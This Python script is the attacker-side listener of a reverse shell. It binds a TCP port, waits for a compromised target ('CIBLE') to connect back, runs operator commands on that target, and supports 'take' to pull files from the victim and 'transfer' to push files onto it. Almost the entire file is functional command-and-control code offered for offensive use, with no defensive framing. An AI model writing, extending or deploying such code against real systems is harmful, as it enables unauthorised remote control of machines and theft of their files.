import socket
import os
import time


# Connecting Target To Attacker
def main(HOST):
    tcp_socket = socket.socket(
        socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)

    PORT = 5000

    tcp_socket.bind((HOST, PORT))
    tcp_socket.listen(1)

    print(f'[Info] Listening for incoming TCP connection on port {PORT}')
    attacker_socket, address_socket = tcp_socket.accept()

    print('[+] We got a connection from: ', address_socket)

    cwd = 'Shell'
    r = attacker_socket.recv(2048).decode('utf8')

    if ('dir:' in r):
        cwd = r[4:]

    while True:
        command = input(f"[CIBLE]: {str(cwd)}>")

        if 'exit' in command:
            attacker_socket.send('exit'.encode('utf8'))
            attacker_socket.close()
            break

        elif 'take' in command:
            attacker_socket.send(command.encode('utf8'))

            file_name = attacker_socket.recv(2048).decode('utf8')
            print("[+] Taking [" + file_name + "]...")
            attacker_socket.send('OK'.encode('utf8'))

            file_size = attacker_socket.recv(2048).decode('utf8')
            attacker_socket.send('OK'.encode('utf8'))
            print("[Info] Total: " + str(int(file_size)/2048) + " KB")

            with open(file_name, "wb") as file:
                c = 0

                start_time = time.time()
                while c < int(file_size):
                    data = attacker_socket.recv(2048)
                    if not (data):
                        break
                    file.write(data)
                    c += len(data)
                end_time = time.time()

            print("[+] File Grabbed. Total time: ", end_time - start_time)
        elif 'transfer' in command:
            attacker_socket.send(command.encode('utf8'))

            file_name = command[9:]
            file_size = os.path.getsize(file_name)

            attacker_socket.send(file_name.encode('utf8'))
            print(attacker_socket.recv(2048).decode('utf8'))

            attacker_socket.send(str(file_size).encode('utf8'))
            print("Getting Response")
            print(attacker_socket.recv(2048).decode('utf8'))

            print("[+] Transferring [" + str(file_size/2048) + "] KB...")

            with open(file_name, "rb") as file:
                c = 0

                start_time = time.time()
                while c < int(file_size):
                    data = file.read(2048)
                    if not (data):
                        break
                    attacker_socket.sendall(data)

                    c += len(data)
                end_time = time.time()

                print("[+] File Transferred. Total time: ",
                      end_time - start_time)
        elif (len(command.strip()) > 0):
            attacker_socket.send(command.encode('utf8'))

            r = attacker_socket.recv(2048).decode('utf8')
            if ('dir:' in r):
                cwd = r[4:]
            else:
                print(r)



"""
ATTACKER AND CIBLE
encodage package modif
decodage package modif
byte for package modif
retrieve ip address modif
"""

if __name__ == "__main__":
    host = input("HOST: ")
    main(host)
